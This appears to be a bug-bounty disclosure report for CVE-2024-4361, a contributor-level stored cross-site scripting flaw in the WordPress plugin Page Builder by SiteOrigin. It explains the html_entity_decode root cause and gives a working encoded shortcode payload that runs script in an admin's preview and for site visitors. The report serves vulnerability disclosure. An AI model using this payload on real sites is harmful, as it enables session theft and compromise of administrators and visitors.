# Post Report Info

- Link: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/siteorigin-panels/page-builder-by-siteorigin-22915-authenticated-contributor-stored-cross-site-scripting-via-siteorigin-widget-shortcode
- CVE: 2024-4361
- Bounty: $325

# Page Builder by SiteOrigin Authenticated (Contributor+) Stored-XSS

The Page Builder by SiteOrigin version: 2.29.13 is vulnerable to an Authenticated (Contributor+) Stored-XSS attack via the `siteorigin_widget` shortcode.

## Affected Plugin

Title: Page Builder by SiteOrigin
Active installations: 700,000
Version: 2.29.13
Slug: siteorigin-panels
Link: https://wordpress.org/plugins/siteorigin-panels/

## Root Cause

In [inc/widget-shortcode.php](https://plugins.trac.wordpress.org/browser/siteorigin-panels/trunk/inc/widget-shortcode.php#L40) on line 40 `html_entity_decode` is used to decode the contents of a shortcode.

```php
$data = self::decode_data( $content );
```

Where the `decode_data` is as follows:

```php
public static function decode_data( $string ) {
    preg_match( '/value="([^"]*)"/', trim( $string ), $matches );

    if ( ! empty( $matches[1] ) ) {
        $data = json_decode( html_entity_decode( $matches[1], ENT_QUOTES ), true );

        return $data;
    } else {
        return array();
    }
}
```

This allows us to insert arbitrary HTML into the page by HTML and JSON encoding our payload. WordPress will prevent us from sending `<script>` tags but will not sanitized HTML or JSON encoded parameters, such as: `&lt;script&gt;`.

## Proof of Concept

1. Install and activate the plugin
2. As a Contributor level user add a new post and enter the following payload in the **code editor**:
```
[siteorigin_widget class="WP_Widget_Text"]
<div> 
<pre> value="{&quot;args&quot;:{&quot;before_widget&quot;:&quot;xxxbefore&quot;,&quot;before_title&quot;:&quot;&quot;,&quot;after_title&quot;:&quot;&quot;,&quot;test123&quot;:111},&quot;instance&quot;:{&quot;title&quot;:&quot;<b>alert(1)</b>&quot;,&quot;text&quot;:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;}}"</pre>
</div>
[/siteorigin_widget]
```
3. Submit for review an observe JavaScript execution on the preview.
4. This will execute against the admin when previewing the post and when published against website visitors to the page.